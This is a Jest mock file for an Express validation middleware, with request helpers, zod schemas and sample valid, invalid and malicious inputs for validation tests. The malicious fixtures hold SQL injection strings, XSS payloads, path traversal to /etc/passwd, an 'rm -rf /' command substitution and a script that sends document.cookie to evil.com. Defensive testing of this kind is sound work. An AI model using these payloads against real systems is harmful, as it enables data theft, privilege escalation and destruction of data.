// backend/src/tests/__mocks__/validate.mock.ts

import { Request, Response, NextFunction } from 'express';
import { z } from 'zod';
import { ApiError } from '../../utils/ApiError';

// ==================== MOCK REQUEST/RESPONSE HELPERS ====================

export const createMockRequest = (overrides: Partial<Request> = {}): Partial<Request> => {
  return {
    body: {},
    query: {},
    params: {},
    headers: {},
    method: 'POST',
    url: '/test',
    ...overrides
  };
};

export const createMockResponse = (): Partial<Response> => {
  const res: Partial<Response> = {
    status: jest.fn().mockReturnThis(),
    json: jest.fn().mockReturnThis(),
    send: jest.fn().mockReturnThis(),
    setHeader: jest.fn().mockReturnThis(),
    end: jest.fn().mockReturnThis(),
  };
  return res;
};

export const createMockNext = (): jest.MockedFunction<NextFunction> => {
  return jest.fn() as jest.MockedFunction<NextFunction>;
};

// ==================== TEST SCHEMAS ====================

export const TestSchema = z.object({
  name: z.string().min(1, 'Name is required'),
  email: z.string().email('Invalid email format'),
  age: z.number().min(18, 'Must be at least 18 years old').optional(),
  tags: z.array(z.string()).optional()
});

export const TestParamsSchema = z.object({
  id: z.string().uuid('Invalid UUID format'),
  slug: z.string().min(1).optional()
});

export const TestQuerySchema = z.object({
  limit: z.string().optional().transform(val => val ? parseInt(val, 10) : undefined),
  offset: z.string().optional().transform(val => val ? parseInt(val, 10) : undefined),
  search: z.string().optional(),
  active: z.string().optional().transform(val => val === 'true')
});

export const TestFileSchema = z.object({
  fieldname: z.string(),
  originalname: z.string().max(100, 'Filename too long'),
  encoding: z.string(),
  mimetype: z.string().regex(/^image\/(jpeg|png|gif)$/i, 'Invalid image type'),
  size: z.number().max(1048576, 'File too large (max 1MB)'),
  buffer: z.instanceof(Buffer)
});

// ==================== MOCK DATA GENERATORS ====================

export const mockValidData = {
  body: {
    name: 'John Doe',
    email: 'john.doe@example.com',
    age: 25,
    tags: ['developer', 'nodejs']
  },
  params: {
    id: '123e4567-e89b-12d3-a456-426614174000',
    slug: 'test-slug'
  },
  query: {
    limit: '10',
    offset: '0',
    search: 'test',
    active: 'true'
  }
};

export const mockInvalidData = {
  body: {
    name: '', // Invalid - empty string
    email: 'invalid-email', // Invalid - not email format
    age: 15, // Invalid - under 18
    tags: 'not-an-array' // Invalid - should be array
  },
  params: {
    id: 'invalid-uuid', // Invalid - not UUID format
    slug: ''
  },
  query: {
    limit: 'not-a-number', // Invalid - not numeric
    offset: '-5', // Invalid - negative
    search: null,
    active: 'maybe' // Invalid - not boolean
  }
};

export const mockMaliciousData = {
  body: {
    name: "<script>alert('xss')</script>",
    email: "'; DROP TABLE users; --",
    age: 999999999999999,
    tags: ["../../../etc/passwd", "$(rm -rf /)"]
  },
  params: {
    id: "'; DELETE FROM users; --",
    slug: "../../../admin"
  },
  query: {
    limit: "'; DROP TABLE sessions; --",
    offset: "../../config",
    search: "<img src=x onerror=alert('xss')>",
    active: "'; UPDATE users SET admin=1; --"
  }
};

// ==================== MOCK FILE DATA ====================

export const mockValidFile = {
  fieldname: 'image',
  originalname: 'valid-image.jpg',
  encoding: '7bit',
  mimetype: 'image/jpeg',
  size: 2048576, // 2MB - within Instagram limits
  buffer: Buffer.from('fake jpeg content')
};

export const mockInvalidFile = {
  fieldname: 'image',
  originalname: 'invalid.pdf',
  encoding: '7bit',
  mimetype: 'application/pdf', // Invalid for Instagram
  size: 1024000,
  buffer: Buffer.from('fake pdf content')
};

export const mockOversizedFile = {
  fieldname: 'image',
  originalname: 'huge.jpg',
  encoding: '7bit',
  mimetype: 'image/jpeg',
  size: 10485760, // 10MB - over Instagram 8MB limit
  buffer: Buffer.from('fake oversized content')
};

export const mockMaliciousFile: Express.Multer.File = {
  fieldname: 'image',
  originalname: '../../../etc/passwd.jpg',
  encoding: '7bit',
  mimetype: 'image/jpeg',
  size: 1024,
  buffer: Buffer.from('malicious content'),
  stream: {} as any,
  destination: '',
  filename: '../../../etc/passwd.jpg',
  path: ''
};

// ==================== VALIDATION SCENARIO GENERATORS ====================

export const generateValidationScenarios = () => ({
  valid: {
    body: [
      mockValidData.body,
      { name: 'Jane Smith', email: 'jane@test.com' }, // Minimal valid
      { name: 'Bob Wilson', email: 'bob@example.org', age: 30, tags: [] } // With optional fields
    ],
    params: [
      mockValidData.params,
      { id: '987fcdeb-51a2-43d1-9f12-123456789abc' }, // Different valid UUID
      { id: 'abcdef12-3456-7890-abcd-ef1234567890', slug: 'another-slug' }
    ],
    query: [
      mockValidData.query,
      {}, // Empty query - all optional
      { limit: '25', search: 'advanced search terms' }
    ]
  },
  invalid: {
    body: [
      mockInvalidData.body,
      { name: 'Valid Name' }, // Missing required email
      { email: 'test@example.com' }, // Missing required name
      { name: 'Test', email: 'invalid' }, // Invalid email format
      { name: 'Test', email: 'test@example.com', age: 'not-a-number' } // Invalid age type
    ],
    params: [
      mockInvalidData.params,
      { id: 'not-a-uuid' }, // Invalid UUID
      { id: '123' }, // Too short
      { id: '' }, // Empty string
      {} // Missing required id
    ],
    query: [
      mockInvalidData.query,
      { limit: 'abc' }, // Non-numeric limit
      { offset: '-10' }, // Negative offset
      { active: 'invalid-boolean' } // Invalid boolean
    ]
  },
  malicious: {
    body: [
      mockMaliciousData.body,
      { name: 'Normal Name', email: "admin'; DROP TABLE users; --@example.com" },
      { name: '<script>window.location="http://evil.com"</script>', email: 'test@example.com' }
    ],
    params: [
      mockMaliciousData.params,
      { id: "'; DELETE FROM sessions WHERE id='1" },
      { id: '../../../admin', slug: 'normal-slug' }
    ],
    query: [
      mockMaliciousData.query,
      { search: 'normal search', limit: "'; DROP DATABASE; --" },
      { search: '<img src=x onerror=fetch("http://evil.com/steal?data="+document.cookie)>' }
    ]
  }
});

// ==================== ERROR ASSERTION HELPERS ====================

export const expectValidationError = (
  error: any,
  expectedCode: string = 'VALIDATION_ERROR',
  expectedStatusCode: number = 400
) => {
  expect(error).toBeDefined();
  expect(error.code || error.statusCode).toBeDefined();
  
  if (error instanceof ApiError) {
    expect(error.code).toBe(expectedCode);
    expect(error.statusCode).toBe(expectedStatusCode);
  } else {
    expect(error.code).toBe(expectedCode);
    expect(error.statusCode).toBe(expectedStatusCode);
  }
};

export const expectApiError = (
  error: any,
  expectedMessage?: string,
  expectedCode?: string,
  expectedStatusCode?: number
) => {
  expect(error).toBeInstanceOf(ApiError);
  
  if (expectedMessage) {
    expect(error.message).toContain(expectedMessage);
  }
  
  if (expectedCode) {
    expect(error.code).toBe(expectedCode);
  }
  
  if (expectedStatusCode) {
    expect(error.statusCode).toBe(expectedStatusCode);
  }
};

export const expectNoError = (mockNext: jest.MockedFunction<NextFunction>) => {
  expect(mockNext).toHaveBeenCalledWith(); // Called with no arguments
  expect(mockNext).not.toHaveBeenCalledWith(expect.any(Error));
  expect(mockNext).not.toHaveBeenCalledWith(expect.any(ApiError));
};

// ==================== PERFORMANCE TESTING HELPERS ====================

export const generateLargeDataset = (size: number = 1000) => {
  const dataset = [];
  for (let i = 0; i < size; i++) {
    dataset.push({
      name: `User ${i}`,
      email: `user${i}@example.com`,
      age: 18 + (i % 50), // Age between 18-67
      tags: [`tag${i % 10}`, `category${i % 5}`]
    });
  }
  return dataset;
};

export const generateComplexNestedData = () => ({
  name: 'Complex User',
  email: 'complex@example.com',
  profile: {
    bio: 'A'.repeat(1000), // Long string
    preferences: {
      theme: 'dark',
      notifications: {
        email: true,
        push: false,
        sms: true
      }
    },
    tags: Array(100).fill(0).map((_, i) => `tag-${i}`), // Many tags
    metadata: {
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      version: 1
    }
  }
});

// ==================== CONCURRENT TESTING HELPERS ====================

export const createConcurrentRequests = (count: number = 10) => {
  return Array(count).fill(0).map((_, i) => ({
    request: createMockRequest({
      body: {
        name: `User ${i}`,
        email: `user${i}@example.com`,
        age: 20 + i
      }
    }),
    response: createMockResponse(),
    next: createMockNext()
  }));
};

// ==================== EDGE CASE DATA ====================

export const edgeCaseData = {
  unicode: {
    name: '测试用户🚀',
    email: 'test@测试.com',
    tags: ['标签1', '🏷️tag', 'ñoño']
  },
  boundaries: {
    name: 'A', // Minimum length
    email: 'a@b.co', // Minimum valid email
    age: 18, // Minimum age
    tags: [] // Empty array
  },
  maximum: {
    name: 'A'.repeat(255), // Very long name
    email: 'very-long-email-address-that-tests-limits@very-long-domain-name-for-testing.com',
    age: 120, // Very old age
    tags: Array(100).fill('tag') // Many tags
  },
  special: {
    name: 'User with "quotes" and \'apostrophes\'',
    email: 'user+tag@example-domain.co.uk',
    age: null, // Null (should be handled)
    tags: ['tag with spaces', 'tag-with-dashes', 'tag_with_underscores']
  }
};

// ==================== MOCK IMPLEMENTATIONS ====================

export const mockValidate = jest.fn();
export const mockValidateBody = jest.fn();
export const mockValidateQuery = jest.fn();
export const mockValidateParams = jest.fn();
export const mockValidateFile = jest.fn();

// Reset function for test cleanup
export const resetAllMocks = () => {
  mockValidate.mockReset();
  mockValidateBody.mockReset();
  mockValidateQuery.mockReset();
  mockValidateParams.mockReset();
  mockValidateFile.mockReset();
};

// ==================== EXPORTS ====================

export default {
  createMockRequest,
  createMockResponse,
  createMockNext,
  TestSchema,
  TestParamsSchema,
  TestQuerySchema,
  TestFileSchema,
  mockValidData,
  mockInvalidData,
  mockMaliciousData,
  mockValidFile,
  mockInvalidFile,
  mockOversizedFile,
  mockMaliciousFile,
  generateValidationScenarios,
  expectValidationError,
  expectApiError,
  expectNoError,
  generateLargeDataset,
  generateComplexNestedData,
  createConcurrentRequests,
  edgeCaseData,
  resetAllMocks
};